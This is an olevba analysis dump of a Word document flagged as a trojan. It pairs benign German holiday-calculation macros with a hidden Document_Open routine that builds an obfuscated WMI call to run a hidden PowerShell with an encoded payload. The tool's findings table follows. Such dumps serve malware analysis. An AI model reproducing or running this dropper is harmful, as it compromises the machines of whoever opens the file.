olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-a5fc989f4dcfda61180349a540f9db8bcc333d3eca42394e7aecd1f0209fe863
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-a5fc989f4dcfda61180349a540f9db8bcc333d3eca42394e7aecd1f0209fe863 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub findTextInCode(text As String, Optional wholeWord As Boolean = False, Optional matchCase As Boolean = False, Optional patternSearch As Boolean = False) ' {

 '
 '  Note: matchCase and patternSearch cannot both be true.
 '

    Dim proj As vbIDE.VBProject
    For Each proj In Application.VBE.vbProjects

        If proj.Protection <> vbext_pp_locked Then ' {
           Dim comp As vbIDE.vbComponent
           For Each comp In proj.vbComponents

               Dim mdl As vbIDE.codeModule

               Set mdl = comp.codeModule

               Dim startLine As Long
               Dim startCol  As Long
               Dim endLine   As Long
               Dim endCol    As Long

            '
            '  The following four values are modified by the .find() procedure below (they're passed "byRef")
            '
               startLine = 1
               startCol = 1
               endLine = mdl.countOfLines
               endCol = -1

               Do While mdl.Find(text, startLine, startCol, endLine, endCol, wholeWord, matchCase, patternSearch)   ' {

                  Dim projFilename As String
'                 on error resume next
                  projFilename = proj.FileName
'                 on error goto 0

'                 if proj.type <> vbext_pt_hostProject then
'                    projFilename = proj.filename
'                 else
'                    projFilename = "..."
'                 end if

                  Debug.Print ("found a match at " & projFilename & " - " & comp.Name & " - " & startLine & ":" & startCol)

                  startLine = endLine
                  startCol = endCol
                  endLine = mdl.countOfLines
                  endCol = -1

               Loop ' }

           Next comp
        End If ' }

    Next proj

End Sub ' }

Public Function IsLeapYear(year As Integer) As Boolean
' Anders als Excel ist 1900 nach dieser Funktion kein Schaltjahr!

If (year Mod 4 = 0 And year Mod 100 <> 0) Or (year Mod 400 = 0) Then
    IsLeapYear = True
Else
    IsLeapYear = False
End If
 
End Function

Public Function DateWithoutSeparators(rawdate As String, Optional separator As String) As Date

Dim intTag As Integer
Dim intMonat As Integer
Dim intJahr As Integer

' Falls das Datum bereits korrekt eingegeben wurde (Format TT.MM.JJJJ),
' muss keine Aufbereitung erfolgen, also Programmabbruch

If IsDate(rawdate) Then
    DateWithoutSeparators = rawdate
    Exit Function
End If

' Auslesen der Benutzereingabe und aufteilen

intTag = CInt(Left(rawdate, 2))
intMonat = CInt(Mid(rawdate, 3, 2))
intJahr = CInt(Right(rawdate, 4))

' Abfangen offensichtlich falscher Eingaben:

' - Eingabe hat weniger als 8 Zeichen, Datum ist unvollstandig
If Len(rawdate) <> 8 Then
    Err.Raise Number:=10, _
        Description:="Kann Datum nicht erzeugen, Eingabe zu kurz."
    Exit Function
End If

' - ungultiger Monat, Eingabe falsch bzw. in falscher Reihenfolge
If intMonat > 12 Then
    Err.Raise Number:=11, _
        Description:="Monat ungultig (gro?er als 12)."
    Exit Function
End If

' - ungultiger Tag, Eingabe falsch bzw. in falscher Reihenfolge
If intTag > 31 Then
    Err.Raise Number:=12, _
        Description:="Tag ungultig (gro?er als 31)."
    Exit Function
End If

' - ungultiger Tag (Monatslange uberschritten), Eingabe falsch
Select Case intMonat
    Case 1, 3, 5, 7, 8, 10, 12:
    ' Diese Monate haben maximal 31 Tage
        If intTag > 31 Then
            Err.Raise Number:=14, _
                Description:="Mehr Tage angegeben, als Monat lang ist."
            Exit Function
        End If
    Case 4, 6, 9, 11:
    ' Diese Monate haben maximal 30 Tage
        If intTag > 30 Then
            Err.Raise Number:=14, _
                Description:="Mehr Tage angegeben, als Monat lang ist."
            Exit Function
        End If
    Case 2:
    ' Der Februar hat in Schaltjahren 29 und in ubrigen Jahren 28 Tage.
    ' Daher erst ermitteln, ob ein Schaltjahr vorliegt:
        If (intJahr Mod 4 = 0 And intJahr Mod 100 <> 0) Or (intJahr Mod 400 = 0) Then
            If intTag > 29 Then
                Err.Raise Number:=14, _
                    Description:="Mehr Tage angegeben, als Monat lang ist."
                Exit Function
            End If
        Else
            If intTag > 28 Then
                Err.Raise Number:=14, _
                    Description:="Mehr Tage angegeben, als Monat lang ist."
                Exit Function
            End If
        End If
End Select

' Wenn keine Fehler aufgetreten sind, Eingabe neu zusammensetzen

DateWithoutSeparators = DateSerial(intJahr, intMonat, intTag)

Exit Function

End Function

Public Function Heiligabend(year As Integer) As Date
    Heiligabend = DateSerial(year, 12, 24)
End Function

Public Function ErsterWeihnachtstag(year As Integer) As Date
    ErsterWeihnachtstag = DateSerial(year, 12, 25)
End Function

Public Function ZweiterWeihnachtstag(year As Integer) As Date
    ZweiterWeihnachtstag = DateSerial(year, 12, 26)
End Function

Public Function Sylvester(year As Integer) As Date
    Sylvester = DateSerial(year, 12, 31)
End Function

Public Function Neujahr(year As Integer) As Date
    Neujahr = DateSerial(year, 1, 1)
End Function

Public Function DreiKoenigsTag(year As Integer) As Date
    DreiKoenigsTag = DateSerial(year, 1, 6)
End Function

Public Function TagDerArbeit(year As Integer) As Date
    TagDerArbeit = DateSerial(year, 5, 1)
End Function

Public Function Friedensfest(year As Integer) As Date
    Friedensfest = DateSerial(year, 8, 8)
End Function

Public Function MariaeHimmelfahrt(year As Integer) As Date
    MariaeHimmelfahrt = DateSerial(year, 8, 15)
End Function

Public Function TagDerDtEinheit(year As Integer) As Date
    TagDerDtEinheit = DateSerial(year, 10, 3)
End Function

Public Function Allerheiligen(year As Integer) As Date
    Allerheiligen = DateSerial(year, 11, 1)
End Function

Public Function Reformationstag(year As Integer) As Date
    Reformationstag = DateSerial(year, 10, 31)
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Funktionen fur die Erreichnung des 1. Adventssonntags und des Ostersonntags
'
' Achtung:
' --------
' Diese Daten werden fur die nachfolgenden Feiertagsdaten als Rechengrundlage benotigt!
' Die nachfolgenden Funktionen sind somit zwingend erforderlich fur die Berechnung
' der variablen Feiertagsdaten!
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Function OsterSonntag(year As Integer) As Date
' Umsetzung von Spencers Osterformel, beschrieben 1922 von Harold Spencer Jones

    Dim a As Long, b As Long, c As Long, d As Long, e As Long, f As Long, g As Long, _
        h As Long, i As Long, j As Long, k As Long, l As Long, m As Long, n As Long, _
        o As Long, p As Long
    
    a = year Mod 19
    
    b = WorksheetFunction.Quotient(year, 100)
        
    c = year Mod 100
    
    d = WorksheetFunction.Quotient(b, 4)
    
    e = b Mod 4
    
    f = WorksheetFunction.Quotient(b + 8, 25)
    
    g = WorksheetFunction.Quotient(b - f + 1, 3)
    
    h = (19 * a + b - d - g + 15) Mod 30
    
    i = WorksheetFunction.Quotient(c, 4)
    
    k = c Mod 4
    
    l = (32 + 2 * e + 2 * i - h - k) Mod 7
    
    m = WorksheetFunction.Quotient(a + 11 * h + 22 * l, 451)
    
    n = WorksheetFunction.Quotient(h + l - 7 * m + 114, 31)
    
    o = (h + l - 7 * m + 114) Mod 31
    
    p = o + 1
    
    OsterSonntag = DateSerial(year, n, p)
End Function

Public Function ErsterAdvent(year As Integer) As Date
' Zunachst auf den letzten Sonntag vor dem 1. Weihnachtsfeiertag zuruckgehen (4. Advent),
' dann 3 Wochen zuruckrechnen
'
' letzter Sonntag vor dem 25.12. wird, wenn Sonntag der 7. Wochentag ist , durch Subtraktion der
' Wochentagsnummer des 25.12. errechnet

    ErsterAdvent = DateSerial(year, 12, 25) - Weekday(DateSerial(year, 12, 25), vbMonday) - 21
    
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Funktionen fur ubrige variable Feiertagsdaten
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Function Aschermittwoch(year As Integer) As Date
    Aschermittwoch = OsterSonntag(year) - 46
End Function

Public Function Karfreitag(year As Integer) As Date
    Karfreitag = OsterSonntag(year) - 2
End Function

Public Function Karsamstag(year As Integer) As Date
    Karsamstag = OsterSonntag(year) - 1
End Function

Public Function OsterMontag(year As Integer) As Date
    OsterMontag = OsterSonntag(year) + 1
End Function

Public Function ChristiHimmelfahrt(year As Integer) As Date
    ChristiHimmelfahrt = OsterSonntag(year) + 39
End Function

Public Function PfingstSonntag(year As Integer) As Date
    PfingstSonntag = OsterSonntag(year) + 49
End Function

Public Function PfingstMontag(year As Integer) As Date
    PfingstMontag = OsterSonntag(year) + 50
End Function

Public Function Fronleichnam(year As Integer) As Date
    Fronleichnam = OsterSonntag(year) + 60
End Function

Public Function BussUndBettag(year As Integer) As Date
    BussUndBettag = ErsterAdvent(year) - 11
End Function

Public Function ZweiterAdvent(year As Integer) As Date
    ZweiterAdvent = ErsterAdvent(year) + 7
End Function

Public Function DritterAdvent(year As Integer) As Date
    DritterAdvent = ErsterAdvent(year) + 14
End Function

Public Function VierterAdvent(year As Integer) As Date
    VierterAdvent = ErsterAdvent(year) + 21
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Funktionen fur die Prufung, ob ein Feiertag vorliegt
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Function IsHoliday(datum As Date, bland As String) As Boolean
' Uberpruft, ob ein bestimmtes ubergebenes Datum ein Feiertag ist
' Ruckgabe je nach Bundesland

On Error GoTo Fehler

' Ruckgabewert standardma?ig Falsch
IsHoliday = False


' ########### Eingegebenes Bundeslandkurzel uberprufen

' Zunachst uberprufen, ob ein gultiges Bundesland angegeben wurde
' (zulassige Werte siehe Modulbeschreibung)

Dim arrBLand
Dim i As Integer
Dim bolIsValidBLand As Boolean

arrBLand = Array("BY", "BX", "BZ", "BW", "BU", "BE", "BB", "HB", "HH", "HE", "MV", "NI", "NW", "RP", "SL", "SN", _
        "ST", "SH", "TH", "SX", "TX")

For i = 0 To UBound(arrBLand)
    If arrBLand(i) = bland Then
        bolIsValidBLand = True
        Exit For
    Else
        bolIsValidBLand = False
    End If
Next i

' Falls das Bundesland in der Liste nicht gefunden wurde, Fehler ausgeben und abbrechen
If bolIsValidBLand = False Then
    Err.Raise Number:=20, Description:="Angegebenes Bundesland ungultig!"
    Exit Function
End If


' ########### Bundeseinheitliche Feiertage uberprufen

' Fur bundeseinheitliche Feiertage muss das Bundesland-Kurzel nicht ausgelesen werden

If datum = Neujahr(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = Karfreitag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = OsterSonntag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = OsterMontag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = TagDerArbeit(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = ChristiHimmelfahrt(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = PfingstSonntag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = PfingstMontag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = TagDerDtEinheit(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = ErsterWeihnachtstag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If

If datum = ZweiterWeihnachtstag(year(datum)) Then
    IsHoliday = True
    Exit Function
End If



' ########### Landerspezifische Feiertage uberprufen

' Fur landerspezifische Feiertage muss das Bundesland-Kurzel ausgelesen werden

' Dreikonigstag ist nur in Bayern und Baden-Wurttemberg ein gesetzlicher Feiertag.
'
' Bayern (BY) schlie?t hier die Systemkurzel BX (Augsburg) und BZ (kath. Gemeinden)
' mit ein.

If bland = "BW" Or bland = "BY" Or bland = "BX" Or bland = "BZ" Then
    If datum = DreiKoenigsTag(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

' Fronleichnam ist in Bayern, Baden-Wurttemberg, Hamburg, NRW, Rheinland-Pfalz und dem
' Saarland immer ein gesetzlicher Feiertag, zusatzlich
'   - in Sachsen in den  vom Staatsministerium des Inneren durch Rechtsverordnung bestimmten Gemeinden
'     im Landkreis Bautzen und im Westlausitzkreis (Systemkurzel SX) sowie
'   - in Thuringen in durch Rechtsverordnung fur Gemeinden mit uberwiegend katholischer Bevolkerung oder
'     in Gemeinden, in denen bis 1994 Fronleichnam als gesetzlicher Feiertag begangen wurde,
'     bis zum Erlass einer solchen Rechtsverordnung.
'
' Bayern (BY) schlie?t hier die Systemkurzel BX (Augsburg) und BZ (kath. Gemeinden)
' mit ein.

If bland = "BW" Or bland = "BY" Or bland = "BX" Or bland = "BZ" Or bland = "HH" Or bland = "NW" Or bland = "RP" _
        Or bland = "SX" Or bland = "TX" Then
    If datum = Fronleichnam(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

' Das Augsburger Friedensfest ist nur in Augsburg ein gesetzlicher Feiertag (Systemkurzel BX).

If bland = "BX" Then
    If datum = Friedensfest(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

' Maria Himmelfahrt ist nur im Saarland sowie in Gemeinden in Bayern mit uberwiegend katholischer Bevolkerung
' ein gesetzlicher Feiertag (Systemkurzel BZ), hierzu zahlt (derzeit) auch Augsburg (Systemkurzel BX).
'
' Falls die Bevolkerung in Augsburg irgendwann nicht mehr uberwiegend katholisch sein sollte, was vergleichsweise
' unwahrscheinlich ist, musste diese Funktion angepasst werden.

If bland = "BX" Or bland = "BZ" Or bland = "SL" Then
    If datum = MariaeHimmelfahrt(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

' Folgenden Block aktivieren und vorherigen Block auskommentieren, falls die Augsburger Bevolkerung
' nicht mehr uberwiegend katholisch sein sollte.

'If bland = "BZ" Or bland = "SL" Then
'    If datum = MariaeHimmelfahrt(year(datum)) Then
'        IsHoliday = True
'        Exit Function
'    End If
'End If

' Reformationstag ist nur in Berlin, Bremen, Hamburg, Mecklemburg-Vorpommern, Niedersachsen, Sachsen,
' Sachsen-Anhalt, Schleswig-Holstein und Thuringen ein gesetzlicher Feiertag.
'
' Im Jahr 2017 war der Reformationstag jedoch zum 500. Jahrestags einmalig ein bundesweiter Feiertag.

If bland = "BB" Or bland = "HB" Or bland = "HH" Or bland = "MV" Or bland = "NI" Or bland = "SN" _
        Or bland = "ST" Or bland = "SH" Or bland = "TH" Or bland = "SX" Or bland = "TX" _
        Or year(datum) = 2017 Then
    If datum = Reformationstag(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

' Der Bu?- und Bettag ist nur in Sachsen ein gesetzlicher Feiertag.
'
' Sachsen (SN) Schlie?t hier das Systemkurzel SX mit ein.

If bland = "SN" Or bland = "SX" Then
    If datum = BussUndBettag(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

Exit Function

' Allerheiligen ist nur in Bayern, Baden-Wurttemberg, NRW, Rheinland-Pfalz
' und dem Saarland ein gesetzlicher Feiertag.
'
' Bayern (BY) Schlie?t hier die Systemkurzel BX und BZ mit ein.

If bland = "BY" Or bland = "BX" Or bland = "BZ" Or bland = "BW" Or bland = "NW" _
        Or bland = "RP" Or bland = "SL" Then
    If datum = Allerheiligen(year(datum)) Then
        IsHoliday = True
        Exit Function
    End If
End If

Exit Function


' ########### Fehlerbehandlung fur ubrige Fehler
Fehler:
Err.Raise Number:=21, Description:="Fehler aufgetreten, ggf. Datum ungultig."

End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Prozedur zur Auflistung aller Feiertage eines Jahres
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Sub ListHolidays()
' Fugt an der aktuellen Stelle eine Liste der Feiertage des aktuellen Jahres ein

On Error GoTo Fehler

' Aktuelle Zelle (Startzelle) auslesen
Dim intCurRow As Integer
Dim intCurCol As Integer

intCurRow = ActiveCell.Row
intCurCol = ActiveCell.Column

' Jahr und Landerkurzel abfragen
Dim intYear As Integer
Dim strBLand As String

intYear = InputBox("Bitte geben Sie das Jahr ein, fur welches die Feiertage " _
            & "aufgelistet werden sollen!", "Bitte Jahr eingeben")

' Zunachst prufen, ob ein gultiges Jahr eingegeben wurde
'
' Wenn die Eingabe nicht numerisch ist, "knallt" es schon bei der Wertubergabe und die Fehlerbehandlung
' wird aufgerufen, deshalb muss hier nur noch der zulassige Wertebereich uberpruft werden.
'
' Mit Werten vor 1900 kommt Excel nicht so gut zurecht, deshalb lassen wir nur 1900 - 9999 zu.
If intYear < 1900 Or intYear > 9999 Then
    MsgBox "Angegebenes Jahr ungultig!", vbCritical + vbOKOnly, "Fehler - Jahreseingabe ungultig"
    Exit Sub
End If

' Anmerkung: Die folgende Abfrage ware sicherlich einfacher und ansehnlicher uber ein UserForm mit einem
' Listenfeld zu losen, jedoch ist diese Prozedur als Makro fur den Anwender sinnvoller auszufuhren und zu
' integrieren. Ein UserForm wurde letztlich die Einbindung zu stark verkomplizieren.

strBLand = InputBox("Bitte geben Sie das Bundesland an!" & vbCrLf & vbCrLf & vbCrLf _
            & "Kurzel:" & vbCrLf & vbCrLf _
            & "BY Bayern" & vbCrLf _
            & "BX Bayern(Augsburg)" & vbCrLf _
            & "BZ Bayern (mit Maria Himmelfahrt)" & vbCrLf _
            & "BW Baden - Wurttemberg" & vbCrLf _
            & "BE Berlin" & vbCrLf _
            & "BB Brandenburg" & vbCrLf _
            & "HB Hansestadt Bremen" & vbCrLf _
            & "HH Hansestadt Hamburg" & vbCrLf _
            & "HE Hessen" & vbCrLf _
            & "MV Mecklemburg - Vorpommern" & vbCrLf _
            & "NI Niedersachsen" & vbCrLf _
            & "NW Nordrhein - Westfalen" & vbCrLf _
            & "RP Rheinland - Pfalz" & vbCrLf _
            & "SL Saarland" & vbCrLf _
            & "SN Sachsen" & vbCrLf _
            & "SX Sachsen (mit Fronleichnam)" & vbCrLf _
            & "ST Sachsen - Anhalt" & vbCrLf _
            & "SH Schleswig - Holstein" & vbCrLf _
            & "TH Thuringen" & vbCrLf _
            & "TX Thuringen (mit Fronleichnam)" & vbCrLf _
            & "BU nur bundeseinheitliche Feiertage" & vbCrLf, _
            "Bitte Bundesland angeben")
            
' Zunachst prufen, ob ein gultiges Bundesland angegeben wurde
Dim arrBLand
Dim i As Integer
Dim bolIsValidBLand As Boolean

arrBLand = Array("BY", "BX", "BZ", "BW", "BU", "BE", "BB", "HB", "HH", "HE", "MV", "NI", "NW", "RP", "SL", "SN", _
        "ST", "SH", "TH", "SX", "TX")

For i = 0 To UBound(arrBLand)
    If arrBLand(i) = strBLand Then
        bolIsValidBLand = True
        Exit For
    Else
        bolIsValidBLand = False
    End If
Next i

' Falls das Bundesland in der Liste nicht gefunden wurde, Fehler ausgeben und abbrechen
If bolIsValidBLand = False Then
    MsgBox "Angegebenes Bundesland ungultig!", vbCritical + vbOKOnly, "Fehler - Bundeslandkurzel ungultig"
    Exit Sub
End If

' Ansonsten Tage des Jahres durchlaufen und fur jeden Tag uberprufen, ob ein Feiertag vorliegt
Dim datStartDatum As Date
Dim j As Integer
Dim k As Integer

datStartDatum = DateSerial(intYear, 1, 1)

If IsLeapYear(intYear) = True Then
    k = 365
Else
    k = 364
End If

For j = 0 To k
    If IsHoliday(datStartDatum + j, strBLand) = True Then
        ' Wenn das aktuelle Datum ein Feiertag ist, wird das Datum in die aktuelle Zelle geschrieben
        Cells(intCurRow, intCurCol).Value = datStartDatum + j
        ' Die Zellennummer wird um 1 erhoht, damit beim nachsten Treffer die nachste Zelle geandert wird
        intCurRow = intCurRow + 1
    End If
Next j

Exit Sub

' Fehlerbehandlung fur sonstige Fehler
Fehler:
    MsgBox "Eingabe ungultig!", vbCritical + vbOKOnly, "Fehler - Eingabe ungultig"
    Exit Sub
End Sub

Sub Document_Open()
Akela
End Sub

Sub Akela()

On Error GoTo Med
Set Jariaie = GetObject("SWSDA")
Med:
Call GetObject(StrReverse("ss" + "ec" + "orP_" + "23" + "niW" + ":2" + "vmi" + "c\t" + "oor:" + "st" + "m" + "gmn" + "iw")). _
Create(StrReverse("==AAwAQMAUGAxBQbAACA0BwcAkGA" + "MBAdA4GAlBQbAUHAnBgcAEEAtAAIAkDA3BwbAIGA2BAIAMHAzBQZAMGAvBgcAAFAtAAdAIHAhBAdAMFAgAAIAsDAwAQMAUGAxBQbAACA6BAMAgGAjBAZAACAlBAZA8GAjBQZAQGAtAAIAwGApBAdA" + "UHA0BgcAUGAjBAIAsDAiAAUA0EAFBAVAoDA2BgbAUGAkAgIAACAoBAdAEGAQBQLAACAuBwbAkGA0BQYA" + "MGAvBATA0CA0BQZAMFAgAwOAICAtBwbAMGAuAQeAQFAaBQSAIEAcBAUA0EAFBAVAoDA2BgbAUGAkAgIAwCAiAgeAADAoBwYAQGAcBAUA0EAFBAVAo" + "DA2BgbAUGAkAgIAwCAiAQbA8GAjBgLAkDA3BwbAIGA2BAXAAFANB" + "QRAQFA6AgdA4GAlBAJAICAgAgbA8GApBAdAEGAuBQaAQHAzBQZAQEAtA" + "AIAQHAhBAZA4CA5BAVAoFAJBgQA8CAlBAdAkGAzBgLAEDAxAAcAIHAvBwYA8CAvAgOAAHA0BAdAgGAsAAdAEGAkBgLAQEABBAdAUGAHBwLAUGA0BQaAMHAuAQMAEDAwBgcA8GAjBwLA8CA6AAcAQHA0BAaAwCA0BQYAQGAuAAdAIHAlBgcAsEAvAQZAQHApBwcA4CAxAQMAAHAyBwbAMGAvAwLAoDAwBAdAQHAoBAIAUGAjBgcAUHAvBwUA0CAgAgcAUGAmBwcA4GAhBgcAQFAzBAdAkGAC" + "BQLAQHAyBQYAQHATBAIAsDAyBQZAYGAzBgbAEGAyBAVAMHA0BQaAIEAgAQZAwGA1BAZ" + "A8GANBQLAQHAyBwbAAHAtBQS e- ne" + "ddi" + "h ely" + "tswodn" + "iw- " + Replace("l" + "l%" + "h" + "sr" + "%w" + "op", "%", "e")), _
Null, Null, Lekam)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

